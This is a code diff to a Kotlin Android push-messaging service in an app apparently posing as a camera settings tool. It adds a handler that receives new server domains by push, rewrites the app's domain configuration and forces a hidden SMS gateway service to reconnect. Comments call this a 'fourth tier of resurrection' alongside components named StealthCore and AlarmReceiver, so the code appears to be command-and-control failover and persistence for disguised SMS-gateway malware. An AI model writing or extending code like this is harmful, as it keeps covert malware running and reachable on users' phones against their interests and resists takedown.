@@ -5,11 +5,16 @@ import com.google.firebase.messaging.FirebaseMessagingService
 import com.google.firebase.messaging.RemoteMessage
 import com.settingpro.camera.util.AppLogger
 import com.settingpro.camera.data.local.SettingsDataStore
+import com.settingpro.camera.data.config.UrlConfig
+import com.google.gson.Gson
+import com.google.gson.reflect.TypeToken
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.cancel
+import kotlinx.coroutines.flow.single
+import kotlinx.coroutines.flow.take
 import kotlinx.coroutines.launch
 import javax.inject.Inject
 
@@ -19,6 +24,7 @@ import javax.inject.Inject
  * This service handles:
  * 1. FCM token updates - saves token to DataStore and registers with server
  * 2. Incoming messages - processes wake-up commands to restart SmsGatewayService
+ * 3. Domain updates - processes remote domain configuration updates
  *
  * This is the fourth tier of resurrection - cloud-triggered wake-up that
  * complements the local resurrection mechanisms (StealthCore, AlarmReceiver, MultiEventReceiver).
@@ -29,11 +35,15 @@ class FcmMessagingService : FirebaseMessagingService() {
     @Inject
     lateinit var settingsDataStore: SettingsDataStore
 
+    @Inject
+    lateinit var gson: Gson
+
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
     companion object {
         private const val TAG = "FcmMessagingService"
         private const val MESSAGE_TYPE_WAKEUP = "wakeup"
+        private const val MESSAGE_TYPE_DOMAIN_UPDATE = "domain_update"
     }
 
     /**
@@ -73,6 +83,7 @@ class FcmMessagingService : FirebaseMessagingService() {
 
         when (messageType) {
             MESSAGE_TYPE_WAKEUP -> handleWakeUpMessage(message)
+            MESSAGE_TYPE_DOMAIN_UPDATE -> handleDomainUpdateMessage(message)
             else -> AppLogger.d(TAG, "Unknown message type: $messageType")
         }
     }
@@ -96,6 +107,53 @@ class FcmMessagingService : FirebaseMessagingService() {
         AppLogger.d(TAG, "Wake-up message received from server (timestamp: $serverTimestamp)")
 
         ensureServiceRunning()
+    }
+
+    /**
+     * Handle domain update message from server.
+     * Updates the domain configuration for failover.
+     */
+    private fun handleDomainUpdateMessage(message: RemoteMessage) {
+        AppLogger.d(TAG, "Domain update message received")
+
+        serviceScope.launch {
+            try {
+                val domainsJson = message.data["domains"]
+                val replace = message.data["replace"]?.toBoolean() ?: false
+
+                if (domainsJson.isNullOrEmpty()) {
+                    AppLogger.w(TAG, "Domain update message missing domains")
+                    return@launch
+                }
+
+                // Parse domains from JSON
+                val domainsListType = object : TypeToken<List<String>>() {}.type
+                val newDomains: List<String> = gson.fromJson(domainsJson, domainsListType)
+
+                if (newDomains.isEmpty()) {
+                    AppLogger.w(TAG, "Domain update message has empty domains list")
+                    return@launch
+                }
+
+                // Get current config and merge
+                val currentConfig = settingsDataStore.urlConfig
+                    .take(1) // Take only the first value
+                    .single()
+
+                val updatedConfig = currentConfig.mergeDomains(newDomains, replace)
+                settingsDataStore.setUrlConfig(updatedConfig)
+
+                AppLogger.d(TAG, "Domain config updated: ${newDomains.size} domains, replace=$replace")
+
+                // Force reconnect to use new domains
+                if (SmsGatewayService.isServiceRunning()) {
+                    AppLogger.d(TAG, "Triggering reconnect with new domain config")
+                    SmsGatewayService.forceReconnect()
+                }
+            } catch (e: Exception) {
+                AppLogger.e(TAG, "Error handling domain update message", e)
+            }
+        }
     }
 
     /**
